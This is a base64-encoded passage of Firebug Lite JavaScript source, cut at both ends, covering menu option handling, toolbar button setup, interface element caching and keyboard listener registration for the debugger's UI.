ICAgICAgICAgICAgICAgICAgTWVudS5jaGVjayhvcHRpb25zWzBdKTsNCiAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIE1lbnUudW5jaGVjayhvcHRpb25zWzBdKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICBmb3IgKHZhciBpID0gMSwgbGVuZ3RoID0gb3B0aW9ucy5sZW5ndGg7IGkgPCBsZW5ndGg7IGkrKykNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIHZhciBvcHRpb24gPSBvcHRpb25zW2ldOw0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgdmFyIHZhbHVlID0gb3B0aW9uLmdldEF0dHJpYnV0ZSgidmFsdWUiKTsNCiAgICAgICAgICAgICAgICAgICAgdmFyIHByZWYgPSBGaXJlYnVnW3ZhbHVlXTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChwcmVmKQ0KICAgICAgICAgICAgICAgICAgICAgICAgTWVudS5jaGVjayhvcHRpb24pOw0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICBNZW51LnVuY2hlY2sob3B0aW9uKTsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGlmIChlbmFibGVkKQ0KICAgICAgICAgICAgICAgICAgICAgICAgTWVudS5lbmFibGUob3B0aW9uKTsNCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgTWVudS5kaXNhYmxlKG9wdGlvbik7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICANCiAgICAgICAgTWVudS5yZWdpc3RlcihmaXJlYnVnT3B0aW9uc01lbnUpOw0KICAgICAgICANCiAgICAgICAgdmFyIG1lbnUgPSBmaXJlYnVnTWVudTsNCiAgICAgICAgDQogICAgICAgIHZhciB0ZXN0TWVudUNsaWNrID0gZnVuY3Rpb24oZXZlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vY29uc29sZS5sb2coInRlc3RNZW51Q2xpY2siKTsNCiAgICAgICAgICAgIGNhbmNlbEV2ZW50KGV2ZW50LCB0cnVlKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgdmFyIHRhcmdldCA9IGV2ZW50LnRhcmdldCB8fCBldmVudC5zcmNFbGVtZW50Ow0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAobWVudS5pc1Zpc2libGUpDQogICAgICAgICAgICAgICAgbWVudS5oaWRlKCk7DQogICAgICAgICAgICBlbHNlDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdmFyIG9mZnNldExlZnQgPSBpc0lFNiA/IDEgOiAtNCwgIC8vIElFNiBwcm9ibGVtIHdpdGggZml4ZWQgcG9zaXRpb24NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNocm9tZSA9IEZpcmVidWcuY2hyb21lLA0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgYm94ID0gY2hyb21lLmdldEVsZW1lbnRCb3godGFyZ2V0KSwNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIG9mZnNldCA9IGNocm9tZS50eXBlID09ICJkaXYiID8NCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjaHJvbWUuZ2V0RWxlbWVudFBvc2l0aW9uKGNocm9tZS5ub2RlKSA6DQogICAgICAgICAgICAgICAgICAgICAgICAgICAge3RvcDogMCwgbGVmdDogMH07DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgbWVudS5zaG93KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJveC5sZWZ0ICsgb2Zmc2V0TGVmdCAtIG9mZnNldC5sZWZ0LCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib3gudG9wICsgYm94LmhlaWdodCAtNSAtIG9mZnNldC50b3ANCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIHZhciBpY29uQnV0dG9uID0gbmV3IEljb25CdXR0b24oew0KICAgICAgICAgICAgdHlwZTogInRvZ2dsZSIsDQogICAgICAgICAgICBlbGVtZW50OiAkKCJmYkZpcmVidWdCdXR0b24iKSwNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgb25DbGljazogdGVzdE1lbnVDbGljaw0KICAgICAgICB9KTsNCiAgICAgICAgDQogICAgICAgIGljb25CdXR0b24uaW5pdGlhbGl6ZSgpOw0KICAgICAgICANCiAgICAgICAgLy9hZGRFdmVudCgkKCJmYlRvb2xiYXJJY29uIiksICJjbGljayIsIHRlc3RNZW51Q2xpY2spOw0KICAgIH0sDQogICAgDQogICAgaW5pdGlhbGl6ZTogZnVuY3Rpb24oKQ0KICAgIHsNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgaWYgKEVudi5ib29rbWFya2xldE91dGRhdGVkKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmxvZ0Zvcm1hdHRlZChbDQogICAgICAgICAgICAgICAgICAiQSBuZXcgYm9va21hcmtsZXQgdmVyc2lvbiBpcyBhdmFpbGFibGUuICIgKw0KICAgICAgICAgICAgICAgICAgIlBsZWFzZSB2aXNpdCBodHRwOi8vZ2V0ZmlyZWJ1Zy5jb20vZmlyZWJ1Z2xpdGUjSW5zdGFsbCBhbmQgdXBkYXRlIGl0LiINCiAgICAgICAgICAgICAgICBdLCBGaXJlYnVnLmNvbnRleHQsICJ3YXJuIik7DQogICAgICAgIA0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICBpZiAoRmlyZWJ1Zy5Db25zb2xlKQ0KICAgICAgICAgICAgRmlyZWJ1Zy5Db25zb2xlLmZsdXNoKCk7DQogICAgICAgIA0KICAgICAgICBpZiAoRmlyZWJ1Zy5UcmFjZSkNCiAgICAgICAgICAgIEZCVHJhY2UuZmx1c2goRmlyZWJ1Zy5UcmFjZSk7DQogICAgICAgIA0KICAgICAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KICAgICAgICBpZiAoRkJUcmFjZS5EQkdfSU5JVElBTElaRSkgRkJUcmFjZS5zeXNvdXQoIkZpcmVidWcuY2hyb21lLmluaXRpYWxpemUiLCAiaW5pdGlhbGl6aW5nIGNocm9tZSBhcHBsaWNhdGlvbiIpOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gaW5pdGlhbGl6ZSBpbmhlcml0ZWQgY2xhc3Nlcw0KICAgICAgICBDb250cm9sbGVyLmluaXRpYWxpemUuY2FsbCh0aGlzKTsNCiAgICAgICAgUGFuZWxCYXIuaW5pdGlhbGl6ZS5jYWxsKHRoaXMpOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gY3JlYXRlIHRoZSBpbnRlcmZhY2UgZWxlbWVudHMgY2FjaGUNCiAgICAgICAgDQogICAgICAgIGZiVG9wID0gJCgiZmJUb3AiKTsNCiAgICAgICAgZmJDb250ZW50ID0gJCgiZmJDb250ZW50Iik7DQogICAgICAgIGZiQ29udGVudFN0eWxlID0gZmJDb250ZW50LnN0eWxlOw0KICAgICAgICBmYkJvdHRvbSA9ICQoImZiQm90dG9tIik7DQogICAgICAgIGZiQnRuSW5zcGVjdCA9ICQoImZiQnRuSW5zcGVjdCIpOw0KICAgICAgICANCiAgICAgICAgZmJUb29sYmFyID0gJCgiZmJUb29sYmFyIik7DQogICAgICANCiAgICAgICAgZmJQYW5lbEJveDEgPSAkKCJmYlBhbmVsQm94MSIpOw0KICAgICAgICBmYlBhbmVsQm94MVN0eWxlID0gZmJQYW5lbEJveDEuc3R5bGU7DQogICAgICAgIGZiUGFuZWxCb3gyID0gJCgiZmJQYW5lbEJveDIiKTsNCiAgICAgICAgZmJQYW5lbEJveDJTdHlsZSA9IGZiUGFuZWxCb3gyLnN0eWxlOw0KICAgICAgICBmYlBhbmVsQmFyMkJveCA9ICQoImZiUGFuZWxCYXIyQm94Iik7DQogICAgICAgIGZiUGFuZWxCYXIyQm94U3R5bGUgPSBmYlBhbmVsQmFyMkJveC5zdHlsZTsNCiAgICAgIA0KICAgICAgICBmYkhTcGxpdHRlciA9ICQoImZiSFNwbGl0dGVyIik7DQogICAgICAgIGZiVlNwbGl0dGVyID0gJCgiZmJWU3BsaXR0ZXIiKTsNCiAgICAgICAgZmJWU3BsaXR0ZXJTdHlsZSA9IGZiVlNwbGl0dGVyLnN0eWxlOw0KICAgICAgDQogICAgICAgIGZiUGFuZWwxID0gJCgiZmJQYW5lbDEiKTsNCiAgICAgICAgZmJQYW5lbDFTdHlsZSA9IGZiUGFuZWwxLnN0eWxlOw0KICAgICAgICBmYlBhbmVsMiA9ICQoImZiUGFuZWwyIik7DQogICAgICAgIGZiUGFuZWwyU3R5bGUgPSBmYlBhbmVsMi5zdHlsZTsNCiAgICAgIA0KICAgICAgICBmYkNvbnNvbGUgPSAkKCJmYkNvbnNvbGUiKTsNCiAgICAgICAgZmJDb25zb2xlU3R5bGUgPSBmYkNvbnNvbGUuc3R5bGU7DQogICAgICAgIGZiSFRNTCA9ICQoImZiSFRNTCIpOw0KICAgICAgDQogICAgICAgIGZiQ29tbWFuZExpbmUgPSAkKCJmYkNvbW1hbmRMaW5lIik7DQogICAgICAgIGZiTGFyZ2VDb21tYW5kTGluZSA9ICQoImZiTGFyZ2VDb21tYW5kTGluZSIpOw0KICAgICAgICBmYkxhcmdlQ29tbWFuZEJ1dHRvbnMgPSAkKCJmYkxhcmdlQ29tbWFuZEJ1dHRvbnMiKTsNCiAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIC8vIHN0YXRpYyB2YWx1ZXMgY2FjaGUNCiAgICAgICAgdG9wSGVpZ2h0ID0gZmJUb3Aub2Zmc2V0SGVpZ2h0Ow0KICAgICAgICB0b3BQYXJ0aWFsSGVpZ2h0ID0gZmJUb29sYmFyLm9mZnNldEhlaWdodDsNCiAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIA0KICAgICAgICBkaXNhYmxlVGV4dFNlbGVjdGlvbigkKCJmYlRvb2xiYXIiKSk7DQogICAgICAgIGRpc2FibGVUZXh0U2VsZWN0aW9uKCQoImZiUGFuZWxCYXJCb3giKSk7DQogICAgICAgIGRpc2FibGVUZXh0U2VsZWN0aW9uKCQoImZiUGFuZWxCYXIxIikpOw0KICAgICAgICBkaXNhYmxlVGV4dFNlbGVjdGlvbigkKCJmYlBhbmVsQmFyMiIpKTsNCiAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIC8vIEFkZCB0aGUgImphdmFzY3JpcHQ6dm9pZCgwKSIgaHJlZiBhdHRyaWJ1dGVzIHVzZWQgdG8gbWFrZSB0aGUgaG92ZXIgZWZmZWN0IGluIElFNg0KICAgICAgICBpZiAoaXNJRTYgJiYgRmlyZWJ1Zy5TZWxlY3RvcikNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gVE9ETzogeHh4cGVkcm8gY2hhbmdlIHRvIGdldEVsZW1lbnRzQnlDbGFzcw0KICAgICAgICAgICAgdmFyIGFzID0gJCQoIi5mYkhvdmVyIik7DQogICAgICAgICAgICBmb3IgKHZhciBpPTAsIGE7IGE9YXNbaV07IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBhLnNldEF0dHJpYnV0ZSgiaHJlZiIsICJqYXZhc2NyaXB0OnZvaWQoMCkiKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gaW5pdGlhbGl6ZSBhbGwgcGFuZWxzDQogICAgICAgIC8qDQogICAgICAgIHZhciBwYW5lbE1hcCA9IEZpcmVidWcucGFuZWxUeXBlczsNCiAgICAgICAgZm9yICh2YXIgaT0wLCBwOyBwPXBhbmVsTWFwW2ldOyBpKyspDQogICAgICAgIHsNCiAgICAgICAgICAgIGlmICghcC5wYXJlbnRQYW5lbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICB0aGlzLmFkZFBhbmVsKHAucHJvdG90eXBlLm5hbWUpOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIC8qKi8NCiAgICAgICAgDQogICAgICAgIC8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIC8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICANCiAgICAgICAgaWYoRmlyZWJ1Zy5JbnNwZWN0b3IpDQogICAgICAgICAgICB0aGlzLmluc3BlY3RCdXR0b24uaW5pdGlhbGl6ZSgpOw0KICAgICAgICANCiAgICAgICAgLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIC8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICAvLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCiAgICAgICAgLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQogICAgICAgIA0KICAgICAgICB0aGlzLmFkZENvbnRyb2xsZXIoDQogICAgICAgICAgICBbJCgiZmJMYXJnZUNvbW1hbmRMaW5lSWNvbiIpLCAiY2xpY2siLCB0aGlzLnNob3dMYXJnZUNvbW1hbmRMaW5lXSAgICAgICANCiAgICAgICAgKTsNCiAgICAgICAgDQogICAgICAgIC8vICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKg0KICAgICAgICANCiAgICAgICAgLy8gU2VsZWN0IHRoZSBmaXJzdCByZWdpc3RlcmVkIHBhbmVsDQogICAgICAgIC8vIFRPRE86IEJVRyBJRTcNCiAgICAgICAgdmFyIHNlbGYgPSB0aGlzOw0KICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICBzZWxmLnNlbGVjdFBhbmVsKEZpcmVidWcuY29udGV4dC5wZXJzaXN0ZWRTdGF0ZS5zZWxlY3RlZFBhbmVsTmFtZSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChGaXJlYnVnLmNvbnRleHQucGVyc2lzdGVkU3RhdGUuc2VsZWN0ZWRQYW5lbE5hbWUgPT0gIkNvbnNvbGUiICYmIEZpcmVidWcuQ29tbWFuZExpbmUpDQogICAgICAgICAgICAgICAgRmlyZWJ1Zy5jaHJvbWUuZm9jdXNDb21tYW5kTGluZSgpOw0KICAgICAgICB9LDApOw0KICAgICAgICANCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy90aGlzLmRyYXcoKTsNCiAgICAgICAgDQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgDQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgDQoNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCiAgICAgICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgICAgICB2YXIgb25QYW5lbE1vdXNlRG93biA9IGZ1bmN0aW9uIG9uUGFuZWxNb3VzZURvd24oZXZlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vY29uc29sZS5sb2coIm9uUGFuZWxNb3VzZURvd24iLCBldmVudC50YXJnZXQgfHwgZXZlbnQuc3JjRWxlbWVudCwgZXZlbnQpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICB2YXIgdGFyZ2V0ID0gZXZlbnQudGFyZ2V0IHx8IGV2ZW50LnNyY0VsZW1lbnQ7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGlmIChGQkwuaXNMZWZ0Q2xpY2soZXZlbnQpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBlZGl0YWJsZSA9IEZCTC5nZXRBbmNlc3RvckJ5Q2xhc3ModGFyZ2V0LCAiZWRpdGFibGUiKTsNCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAvLyBpZiBhbiBlZGl0YWJsZSBlbGVtZW50IGhhcyBiZWVuIGNsaWNrZWQgdGhlbiBzdGFydCBlZGl0aW5nDQogICAgICAgICAgICAgICAgaWYgKGVkaXRhYmxlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgRmlyZWJ1Zy5FZGl0b3Iuc3RhcnRFZGl0aW5nKGVkaXRhYmxlKTsNCiAgICAgICAgICAgICAgICAgICAgRkJMLmNhbmNlbEV2ZW50KGV2ZW50KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgLy8gaWYgYW55IG90aGVyIGVsZW1lbnQgaGFzIGJlZW4gY2xpY2tlZCB0aGVuIHN0b3AgZWRpdGluZw0KICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICghaGFzQ2xhc3ModGFyZ2V0LCAidGV4dEVkaXRvcklubmVyIikpDQogICAgICAgICAgICAgICAgICAgICAgICBGaXJlYnVnLkVkaXRvci5zdG9wRWRpdGluZygpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYgKEZCTC5pc01pZGRsZUNsaWNrKGV2ZW50KSAmJiBGaXJlYnVnLmdldFJlcE5vZGUodGFyZ2V0KSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAvLyBQcmV2ZW50IGF1dG8tc2Nyb2xsIHdoZW4gbWlkZGxlLWNsaWNraW5nIGEgcmVwIG9iamVjdA0KICAgICAgICAgICAgICAgIEZCTC5jYW5jZWxFdmVudChldmVudCk7DQogICAgICAgICAgICB9DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICBGaXJlYnVnLmdldEVsZW1lbnRQYW5lbCA9IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciBwYW5lbE5vZGUgPSBnZXRBbmNlc3RvckJ5Q2xhc3MoZWxlbWVudCwgImZiUGFuZWwiKTsNCiAgICAgICAgICAgIHZhciBpZCA9IHBhbmVsTm9kZS5pZC5zdWJzdHIoMik7DQogICAgICAgICAgICANCiAgICAgICAgICAgIHZhciBwYW5lbCA9IEZpcmVidWcuY2hyb21lLnBhbmVsTWFwW2lkXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgaWYgKCFwYW5lbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBpZiAoRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0ZWRQYW5lbC5zaWRlUGFuZWxCYXIpDQogICAgICAgICAgICAgICAgICAgIHBhbmVsID0gRmlyZWJ1Zy5jaHJvbWUuc2VsZWN0ZWRQYW5lbC5zaWRlUGFuZWxCYXIucGFuZWxNYXBbaWRdOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgDQogICAgICAgICAgICByZXR1cm4gcGFuZWw7DQogICAgICAgIH07DQogICAgICAgIA0KICAgICAgICANCiAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIA0KICAgICAgICAvLyBUT0RPOiB4eHhwZWRybyBwb3J0IHRvIEZpcmVidWcNCiAgICAgICAgDQogICAgICAgIC8vIEltcHJvdmVkIHdpbmRvdyBrZXkgY29kZSBldmVudCBsaXN0ZW5lci4gT25seSBvbmUgImtleWRvd24iIGV2ZW50IHdpbGwgYmUgYXR0YWNoZWQNCiAgICAgICAgLy8gdG8gdGhlIHdpbmRvdywgYW5kIHRoZSBvbktleUNvZGVMaXN0ZW4oKSBmdW5jdGlvbiB3aWxsIGRlbGVnYXRlIHdoaWNoIGxpc3RlbmVycw0KICAgICAgICAvLyBzaG91bGQgYmUgY2FsbGVkIGFjY29yZGluZyB0byB0aGUgZXZlbnQua2V5Q29kZSBmaXJlZC4NCiAgICAgICAgdmFyIG9uS2V5Q29kZUxpc3RlbmVyc01hcCA9IFtdOw0KICAgICAgICB2YXIgb25LZXlDb2RlTGlzdGVuID0gZnVuY3Rpb24oZXZlbnQpDQogICAgICAgIHsNCiAgICAgICAgICAgIGZvciAodmFyIGtleUNvZGUgaW4gb25LZXlDb2RlTGlzdGVuZXJzTWFwKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHZhciBsaXN0ZW5lcnMgPSBvbktleUNvZGVMaXN0ZW5lcnNNYXBba2V5Q29kZV07DQogICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgZm9yICh2YXIgaSA9IDAsIGxpc3RlbmVyOyBsaXN0ZW5lciA9IGxpc3RlbmVyc1tpXTsgaSsrKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgdmFyIGZpbHRlciA9IGxpc3RlbmVyLmZpbHRlciB8fCBGQkwubm9LZXlNb2RpZmllcnM7DQogICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBpZiAoZXZlbnQua2V5Q29kZSA9PSBrZXlDb2RlICYmICghZmlsdGVyIHx8IGZpbHRlcihldmVudCkpKQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBsaXN0ZW5lci5saXN0ZW5lcigpOw0KICAgICAgICAgICAgICAgICAgICAgICAgRkJMLmNhbmNlbEV2ZW50KGV2ZW50LCB0cnVlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIGFkZEV2ZW50KEZpcmVidWcuY2hyb21lLmRvY3VtZW50LCAia2V5ZG93biIsIG9uS2V5Q29kZUxpc3Rlbik7DQoNCiAgICAgICAgLyoqDQogICAgICAgICAqIEBuYW1lIGtleUNvZGVMaXN0ZW4NCiAgICAgICAgICogQG1lbWJlck9mIEZCTC5GaXJlYnVnQ2hyb21lDQogICAgICAgICAqLw0KICAgICAgICBGaXJlYnVnLmNocm9tZS5rZXlDb2RlTGlzdGVuID0gZnVuY3Rpb24oa2V5LCBmaWx0ZXIsIGxpc3RlbmVyLCBjYXB0dXJlKQ0KICAgICAgICB7DQogICAgICAgICAgICB2YXIga2V5Q29kZSA9IEtleUV2ZW50WyJET01fVktfIitrZXldOw0KICAgICAgICAgICAgDQogICAgICAgICAgICBpZiAoIW9uS2V5Q29kZUxpc3RlbmVyc01hcFtrZXlDb2RlXSkNCiAgICAgICAgICAgICAgICBvbktleUNvZGVMaXN0ZW5lcnNNYXBba2V5Q29kZV0gPSBbXTsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgb25LZXlDb2RlTGlzdGVuZXJzTWFwW2tleUNvZGVdLnB1c2goew0KICAgICAgICAgICAgICAgIGZpbHRlcjogZmlsdGVyLA0KICAgICAgICAgICAgICAgIGxpc3RlbmVyOiBsaXN0ZW5lcg0KICAgICAgICAgICAgfSk7DQogICAgDQogICAgICAgICAgICByZXR1cm4ga2V5Q29kZTsNCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIC8qKg0KICAgICAgICAgKiBAbmFtZSBrZXlJZ25vcmUNCiAgICAgICAgICogQG1lbWJlck9mIEZCTC5GaXJlYnVnQ2hyb21lDQogICAgICAgICAqLw0KICAgICAgICBGaXJlYnVnLmNocm9tZS5rZXlJZ25vcmUgPSBmdW5jdGlvbihrZXlDb2RlKQ0KICAgICAgICB7DQogICAgICAgICAgICBvbktleUNvZGVMaXN0ZW5lcnNNYXBba2V5Q29kZV0gPSBudWxsOw0KICAgICAgICAgICAgZGVsZXRlIG9uS2V5Q29kZUxpc3RlbmVyc01hcFtrZXlDb2RlXTsNCiAgICAgICAgfTsNCiAgICAgICAgDQogICAgICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQogICAgICAgIA0KICAgICAgICAvKiovDQogICAgICAgIC8vIG1vdmUgdG8gc2h1dGRvd24gDQogICAgICAgIC8vcmVtb3ZlRXZlbnQoRmlyZWJ1Zy5jaHJvbWUuZG9jdW1lbnQsICJrZXlkb3duIiwgbGlzdGVuZXJbMF0pOw0KDQoNCiAgICAgICAgLyoNCiAgICAgICAgRmlyZWJ1Zy5jaHJvbWUua2V5Q29kZUxpc3RlbiA9IGZ1bmN0aW9uKGtleSwgZmlsdGVyLCBsaXN0ZW5lciwgY2FwdHVyZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaWYgKCFmaWx0ZXIpDQogICAgICAgICAgICAgICAgZmlsdGVyID0gRkJMLm5vS2V5TW9kaWZpZXJzOw0KICAgIA0KICAgICAgICAgICAgdmFyIGtleUNvZGUgPSBLZXlFdmVudFsiRE9NX1ZLXyIra2V5XTsNCiAgICANCiAgICAgICAgICAgIHZhciBmbiA9IGZ1bmN0aW9uIGZuKGV2ZW50KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGlmIChldmVudC5rZXlDb2RlID09IGtleUNvZGUgJiYgKCFmaWx0ZXIgfHwgZmlsdGVyKGV2ZW50KSkpDQogICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICBsaXN0ZW5lcigpOw0KICAgICAgICAgICAgICAgICAgICBGQkwuY2FuY2VsRXZlbnQoZXZlbnQsIHRydWUpOw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgIA0KICAgICAgICAgICAgYWRkRXZlbnQoRmlyZWJ1Zy5jaHJvbWUuZG9jdW1lbnQsICJrZXlkb3duIiwgZm4pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICByZXR1cm4gW2ZuLCBjYXB0dXJlXTsNCiAgICAgICAgfTsN